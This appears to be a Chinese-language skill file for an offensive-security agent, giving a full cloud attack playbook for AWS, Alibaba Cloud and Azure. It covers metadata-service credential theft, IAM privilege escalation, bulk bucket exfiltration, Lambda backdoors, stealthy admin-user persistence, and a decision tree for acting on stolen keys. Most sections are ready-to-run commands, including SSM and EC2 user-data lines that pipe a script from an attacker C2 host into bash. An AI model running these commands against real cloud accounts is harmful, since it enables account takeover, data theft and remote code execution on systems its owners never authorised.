---
description: 云环境攻击全链路。覆盖 AWS、阿里云、Azure 三大平台（GCP 暂未覆盖，需联网搜索或查知识库）。从初始访问到资源接管。包括 IMDS 利用、IAM 提权、存储桶攻击、云函数劫持、跨服务横向、AK/SK 利用。
---

# 云环境攻击

## 核心原则

==云攻击的核心不同于传统内网：没有子网扫描（不是那样横向的），靠的是 IAM 提权路径、元数据服务、跨服务信任链。拿了 AK/SK 不是终点——看这 AK/SK 能做什么，再渗透到更多服务。==

> 前置: SSRF 入口通过 @web-exploit.md 获取；服务器 shell 通过 @post-exploit.md。SSRF → IMDS 利用链参考 @chain-attack.md。Azure AD Connect 攻击参考 @ad-attack.md。

## 攻击路径总览

```
初始访问
  ├── Web 漏洞 → SSRF → IMDS → AK/SK
  ├── 源码泄露 (.git/.env) → 硬编码 AK/SK
  ├── 存储桶公开 → 下载源码/配置文件
  └── 钓鱼 → 云控制台密码

拿到 AK/SK
  ├── 1. 身份确认（whoami → 什么角色/用户？什么权限？）
  ├── 2. 权限枚举（能 List 什么？能 Create 什么？）
  ├── 3. IAM 提权（自己能给自己加什么权限？）
  ├── 4. 数据收集（S3/OSS/COS 桶遍历 → 找敏感数据）
  ├── 5. 横向移动（EC2/ECS/VM → 服务器层面渗透）
  ├── 6. 持久化（创建后门用户/角色/访问密钥/云函数触发器）
  └── 7. 影响（加密勒索/数据窃取/资源劫持挖矿）
```

---

## 平台 1：AWS

### 1a. 身份确认

```bash
# 确认当前身份 (WhoAmI)
aws sts get-caller-identity
# 返回: UserId, Account, Arn

# 判断身份类型:
# ARN 含 assumed-role → 临时角色（SSRF IMDS 获取的通常是这个）
# ARN 含 iam::user → IAM 用户
# ARN 含 federated → 联合身份

# 如果是从 IMDS 获取的:
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/info
# 返回: 实例绑定的 IAM Role 名称
```

### 1b. 权限枚举

```bash
# 列所有用户（看自己能看到谁）
aws iam list-users
aws iam list-roles

# 列所有 S3 桶
aws s3 ls

# 列所有 EC2
aws ec2 describe-instances --region <REGION>

# 列所有 Lambda
aws lambda list-functions --region <REGION>

# 列所有 RDS/DynamoDB
aws rds describe-db-instances --region <REGION>
aws dynamodb list-tables --region <REGION>

# 列所有 ECS/EKS
aws ecs list-clusters --region <REGION>
aws eks list-clusters --region <REGION>

# 列所有 Secrets Manager 中的密钥
aws secretsmanager list-secrets --region <REGION>

# 列 KMS 密钥
aws kms list-keys --region <REGION>

# 列 CloudFormation 栈
aws cloudformation describe-stacks --region <REGION>

# 自动化权限枚举
# 用 enumerate-iam 或 pacu 的 iam__enum_permissions 模块
# 遍历所有常见 API 调用，测试哪些被允许
```

### 1c. IAM 提权路径

```
常见 AWS IAM 提权方法:

1. iam:CreatePolicyVersion → 修改已有策略
   条件: 自己有 iam:CreatePolicyVersion 权限
   操作: 新建策略版本设为 AdministratorAccess
   影响: 给自己或角色附加完整管理权限

2. iam:AttachUserPolicy / AttachRolePolicy → 直接附加管理员策略
   条件: 有 iam:AttachUserPolicy 或 AttachRolePolicy
   操作: 把 AdministratorAccess 策略绑定给自己

3. iam:CreateAccessKey → 创建其他高权限用户的 AK/SK
   条件: 有 iam:CreateAccessKey 权限
   操作: 给目标用户创建 AK/SK → 用新 AK/SK 操作

4. iam:UpdateAssumeRolePolicy → 修改角色的信任策略
   条件: 有 iam:UpdateAssumeRolePolicy
   操作: 在 AssumeRole 白名单中加入自己的 ARN → 跨账户访问

5. sts:AssumeRole → 切换到更高权限角色
   条件: 角色的信任策略允许你的身份
   操作: aws sts assume-role --role-arn <TARGET_ROLE> --role-session-name test

6. ec2:RunInstances → 创建 EC2 并绑定高权限角色
   条件: 有 ec2:RunInstances + iam:PassRole
   操作: 创建 EC2 → 绑定高权限 IAM Role → SSH 进去 → 从 IMDS 获取该 Role 的临时 AK/SK

7. lambda:CreateFunction + iam:PassRole → 创建恶意 Lambda 函数
   条件: 有 lambda:CreateFunction + iam:PassRole
   操作: 创建 Lambda → 绑高权限 Role → Lambda 内部执行恶意代码

8. cloudformation:CreateStack → 通过 CloudFormation 创建资源
   条件: cloudformation:CreateStack + iam:PassRole
   操作: 用 CloudFormation 模板创建高权限 IAM 用户
```

### 1d. S3 数据收集

```bash
# 列所有桶
aws s3 ls

# 检查桶的公开访问状态
aws s3api get-bucket-acl --bucket <BUCKET>
aws s3api get-bucket-policy --bucket <BUCKET>
aws s3api get-public-access-block --bucket <BUCKET>

# 列桶内容
aws s3 ls s3://<BUCKET>/
aws s3 ls s3://<BUCKET>/ --recursive

# 搜索敏感文件
aws s3 ls s3://<BUCKET>/ --recursive | grep -iE "backup|dump|password|secret|key|token|config|credential|database|db"

# 下载桶内容
aws s3 sync s3://<BUCKET>/ /tmp/s3_dump/

# 公开桶发现（无需认证）
curl http://<BUCKET>.s3.amazonaws.com/
curl http://<BUCKET>.s3-<REGION>.amazonaws.com/
```

### 1e. EC2 横向移动

```bash
# 列所有 EC2 实例
aws ec2 describe-instances --region <REGION> | jq '.Reservations[].Instances[] | {InstanceId, PrivateIpAddress, PublicIpAddress, State: .State.Name, Tags: .Tags}'

# 获取 Windows 管理员密码（需要在启动时指定了 Key Pair）
aws ec2 get-password-data --instance-id <INSTANCE_ID> --priv-launch-key <PEM_FILE>

# 修改安全组 → 放行自己 IP
aws ec2 authorize-security-group-ingress \
  --group-id <SG_ID> --protocol tcp --port 22 --cidr <YOUR_IP>/32

# 通过 SSM 执行命令（如果启用了 SSM Agent）
aws ssm send-command --instance-ids <INSTANCE_ID> \
  --document-name "AWS-RunShellScript" \
  --parameters '{"commands":["curl http://YOUR_C2/shell.sh | bash"]}'

# 通过 User Data 执行（需要停止/启动实例）
aws ec2 modify-instance-attribute --instance-id <INSTANCE_ID> \
  --user-data "#!/bin/bash\ncurl http://YOUR_C2/shell.sh|bash"
# 然后: aws ec2 stop-instances → aws ec2 start-instances

# 创建 AMI + 共享到攻击者账户 → 导出数据
aws ec2 create-image --instance-id <INSTANCE_ID> --name "backup"
```

### 1f. Lambda 后门

```bash
# 列 Lambda 函数
aws lambda list-functions --region <REGION>

# 导出函数代码
aws lambda get-function --function-name <FUNC> --region <REGION> | jq -r '.Code.Location'
# → URL 下载 zip 包（预签名 URL，有时效）

# 修改函数代码（注入后门）
# 1. 下载现有代码
# 2. 在 handler 中加入后门逻辑
# 3. 重新打包上传
aws lambda update-function-code --function-name <FUNC> \
  --zip-file fileb://backdoored.zip --region <REGION>

# 创建新 Lambda 触发器（从 S3/SQS/SNS 触发 → 横向到其他服务）
```

### 1g. 持久化

```
AWS 持久化方法:

1. 创建 IAM 用户 + AK/SK:
   aws iam create-user --user-name <INCONSPICUOUS_NAME>
   aws iam create-access-key --user-name <USER>
   aws iam attach-user-policy --user-name <USER> \
     --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

2. 创建 AssumeRole 后门:
   修改信任策略: 加入攻击者 ARN → 随时 AssumeRole 进来

3. Lambda 触发器后门:
   创建 CloudWatch Events 规则 → 定时触发 Lambda → 执行反弹 shell
   或 S3 事件触发 Lambda → 每次有新文件上传就执行

4. 被入侵 EC2 的 SSM Agent 后门:
   SSM 的 Session Manager → 不用 SSH 不用安全组 → 随时连

5. CloudFormation 栈:
   创建看似正常的 CloudFormation 栈 → 定期重建被删的资源

6. 跨账户访问:
   用 UpdateAssumeRolePolicy 在目标账户创建到攻击者账户的信任
   → 从攻击者账户 AssumeRole 进入目标账户
```

---

## 平台 2：阿里云

### 2a. IMDS 获取 AK/SK

```bash
# AliCloud IMDS (ECS 实例元数据)
# 普通模式（无 token 保护）
curl http://100.100.100.200/latest/meta-data/
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/<ROLE_NAME>

# IMDSv2 类似保护（部分地域启用）
TOKEN=$(curl -s -X PUT "http://100.100.100.200/latest/api/token" \
  -H "X-aliyun-ecs-metadata-token-ttl-seconds: 21600")
```

### 2b. 权限枚举与提权

```bash
# 身份确认
aliyun sts GetCallerIdentity

# 列 RAM 用户
aliyun ram ListUsers

# 列 RAM 角色
aliyun ram ListRoles

# 列 ECS
aliyun ecs DescribeInstances --RegionId cn-hangzhou

# 列 OSS 桶
aliyun oss ls

# 列 RDS
aliyun rds DescribeDBInstances --RegionId cn-hangzhou

# RAM 提权（与 AWS 类似）:
# 1. ram:CreatePolicyVersion → 修改策略
# 2. ram:AttachPolicyToUser → 直接附加 AdministratorAccess
# 3. ram:CreateAccessKey → 给其他用户创建 AK/SK
# 4. ram:UpdateAssumeRolePolicy → 修改角色信任策略
```

### 2c. OSS 数据收集

```bash
# 列桶
aliyun oss ls

# 检查桶 ACL（公开访问）
curl https://<BUCKET>.oss-cn-<REGION>.aliyuncs.com/
# 200 → 公开可列目录 | 403 → 禁公开 | 404 → 不存在

# 列举桶内文件（如果 200）
curl https://<BUCKET>.oss-cn-<REGION>.aliyuncs.com/?prefix=&max-keys=1000

# 桶名推测（公司名/域名变体 + 常见后缀）
PREFIXES="company company-prod company-test company-dev company-backup company-static"

# 常见地域 endpoint:
# oss-cn-hangzhou, oss-cn-shanghai, oss-cn-beijing
# oss-cn-shenzhen, oss-cn-hongkong, oss-ap-southeast-1
```

### 2d. 持久化

```
阿里云持久化:
1. 创建 RAM 用户 + AK/SK
2. 修改 RAM 角色信任策略（加入攻击者账户 UID）
3. 函数计算 (FC) 触发器后门
4. OSS 事件通知 → MNS → 执行恶意操作
```

---

## 平台 3：Azure

### 3a. 元数据与身份

```bash
# Azure IMDS (实例元数据)
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# 获取 Managed Identity Token
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.azure.com/"

# 用 token 调 Azure REST API
TOKEN="<TOKEN>"
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# 列资源组
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<SUB_ID>/resourceGroups?api-version=2020-01-01"

# 列 VM
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<SUB_ID>/providers/Microsoft.Compute/virtualMachines?api-version=2020-06-01"

# 列存储账户
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<SUB_ID>/providers/Microsoft.Storage/storageAccounts?api-version=2019-06-01"

# 列 Key Vault
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<SUB_ID>/providers/Microsoft.KeyVault/vaults?api-version=2019-09-01"
```

### 3b. Azure AD / Entra ID

```powershell
# 连接 Azure AD (需要 AzureAD 模块)
Connect-AzureAD

# 列所有用户
Get-AzureADUser -All $true

# 列所有应用/服务主体
Get-AzureADApplication -All $true
Get-AzureADServicePrincipal -All $true

# 列所有设备
Get-AzureADDevice -All $true

# 检查目录角色
Get-AzureADDirectoryRole | Get-AzureADDirectoryRoleMember

# 关键攻击面:
# 1. 服务主体的 Client Secret/Certificate → 长期凭据
# 2. 应用权限 (Application Permission) → 比委派权限更危险
# 3. 管理单元 (Administrative Unit) → 受限管理员
# 4. PIM (Privileged Identity Management) → 可以激活角色
```

### 3c. Azure AD Connect 攻击

```
Azure AD Connect: 同步本地 AD 到 Azure AD
  驻留在本地服务器上，有极高权限

攻击方向:
  1. AAD Connect 服务器本地管理员 → 提取配置中的所有凭据
  2. AAD Connect 的 MSOL_ 服务账户 → 通常 = 本地 AD 的高权限账户
  3. 同步规则 → 修改后可以把任意用户同步为 Azure AD 的 Global Admin
  4. AAD Connect 数据库 (.mdf) → 包含所有同步用户的密码哈希

工具:
  - AADInternals: PowerShell 模块，全面的 Azure AD 攻击工具
  - ROADtools: Azure AD 枚举和令牌操作
```

### 3d. Azure 持久化

```
1. 创建服务主体 + Client Secret (长期有效):
   az ad sp create-for-rbac --name <NAME> --years 99

2. 添加 Guest 用户（外部账户）→ 给 Global Admin 权限

3. Azure Function 后门:
   创建定时/HTTP 触发器函数 → 执行恶意代码

4. VM RunCommand:
   在 VM 上创建 RunCommand → 随时执行

5. 共享 Access Signature (SAS) Token:
   创建长期有效 + 高权限的 SAS Token → 匿名访问存储账户

6. OAuth 应用同意 (Consent Grant):
   创建恶意 OAuth 应用 → 钓鱼让管理员同意 → 拿到长期 access token
```

---

## 跨平台通用技术

### AK/SK 泄露源汇总

```
AWS:
  - IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/
  - IMDSv2: PUT token → 同上
  - .env 文件 / .git 泄露
  - 开发者本地的 ~/.aws/credentials
  - CI/CD 环境变量
  - Lambda 环境变量 /tmp 文件
  - ECS 任务定义中的环境变量

阿里云:
  - IMDS: http://100.100.100.200/latest/meta-data/ram/security-credentials/
  - ~/.aliyun/config.json
  - .env 中的 ALIBABA_CLOUD_ACCESS_KEY_ID

Azure:
  - IMDS: http://169.254.169.254/metadata/identity/oauth2/token
  - 环境变量: IDENTITY_ENDPOINT / IDENTITY_HEADER
  - Service Principal 的 Client Secret
  - 证书存储中的 PFX 证书
```

### 云 SSRF 利用链

```
1. SSRF → IMDS → 临时 AK/SK
   最直接的链: 应用有 SSRF → 访问 169.254.169.254 或 100.100.100.200

2. SSRF → 内部云 API
   AWS: https://ec2.amazonaws.com/ (内部可达, 无需公网)
   阿里云: 内网 API 端点 (内部可达)

3. SSRF → 控制 DNS → 重定向到 IMDS
   DNS Rebinding: TTL=0 → 第一次解析为合法 IP → SSRF 验证通过
   → 第二次解析为 169.254.169.254 → 访问 IMDS

4. SSRF + gopher:// → Redis/内部服务
   利用 gopher:// 协议与内部 Redis/MySQL 通信
   → 写 crontab/SSH key → 获取服务器 shell
   → 从服务器上的 IMDS 获取 AK/SK

5. 绕过 IMDSv2
   IMDSv2 需要 PUT 请求获取 token
   但如果 SSRF 支持 PUT → 先 PUT 获取 token → 再用 token 访问
   大多数 SSRF 不支持 PUT → 找其他入口
```

### 云函数劫持

```
所有云平台:
  1. 修改函数代码 → 加后门
  2. 修改函数环境变量 → 加入恶意配置
  3. 添加触发器 (HTTP, Timer, Event) → 定期执行
  4. 修改函数的 IAM Role/服务角色 → 扩大权限

价值:
  - Lambda/FC: 通常绑定了高权限服务角色
  - 可以从函数内部横向到 S3/OSS, RDS, DynamoDB, SQS 等
  - 函数代码中经常硬编码数据库密码/AK/密钥
```

---

## 常用工具速查

| 工具 | 平台 | 用途 |
|------|------|------|
| aws-cli | AWS | AWS 命令行管理 |
| aliyun-cli | 阿里云 | 阿里云命令行管理 |
| az-cli | Azure | Azure 命令行管理 |
| pacu | AWS | AWS 漏洞利用框架 |
| enumerate-iam | AWS | AWS IAM 权限枚举 |
| ScoutSuite | AWS/Azure/GCP | 云安全审计 |
| cloudsplaining | AWS | IAM 策略最小化分析 |
| cloudmapper | AWS | AWS 环境可视化 |
| ROADtools | Azure | Azure AD 攻击 |
| AADInternals | Azure | Azure AD 内部攻击 |
| Stormspotter | Azure | Azure 攻击面映射 |
| MicroBurst | Azure | Azure 安全测试 |
| certipy | AD CS | 证书攻击 (云 AD 场景) |
| PowerShell | Azure | Azure AD 模块 |

---

## 攻击决策树

```
拿到 AK/SK 后:

1. whoami（什么身份）
   ├── IAM User → 看权限
   ├── Assumed Role (临时) → 有过期时间, 尽快行动
   └── Root/Account Owner → 一切权限

2. 枚举权限
   ├── 能 list users/roles → 找更高权限目标
   ├── 能 create/attach policy → 直接提权
   ├── 能 create access key → 用已有高权限用户创建 AK
   ├── 能 AssumeRole → 横向到其他角色
   └── 只能 read → 数据收集(S3/OSS/DB/RDS)

3. 横向移动
   ├── 能 create EC2/VM → 创建实例 + 绑高权限角色
   ├── 能 create Lambda/FC → 创建函数 + 绑高权限角色
   ├── 能 modify Security Group → 放行自己 IP → SSH/RDP
   ├── 能 run SSM/RunCommand → 在已有实例上执行命令
   └── 全部不能 → 纯数据收集

4. 持久化
   ├── 创建 IAM 用户 + AK/SK
   ├── 修改角色信任策略(AssumeRole 后门)
   ├── Lambda/FC 定时器后门
   └── 跨账户访问(X 账户 → 目标账户)

5. 发现是云函数/容器环境
   ├── 函数环境变量 → 可能含其他 AK/SK
   ├── /tmp 目录 → 可能有临时文件含密钥
   └── VPC 内 → 内网可达数据库/Redis/内部 API
```

> 知识库路径见 @knowledge-base.md 或 @environment.md

## 交叉引用与路由

| 场景 | 转向 |
|------|------|
| SSRF → IMDS | @web-exploit.md 获取 SSRF 入口，本 skill 接续云利用 |
| 服务器 shell | @post-exploit.md 获取 shell，本 skill 接续 AK/SK 利用 |
| AK/SK 已获取 | 直接本 skill「IAM 提权」章节 |
| Azure AD Connect | @ad-attack.md 跨域攻击 |
| GCP 环境 | ⚠️ 本 skill 未覆盖 GCP 细节，查知识库 `04-后渗透/` 或联网搜索 |
| 漏洞链组合 | @chain-attack.md 云相关模式 |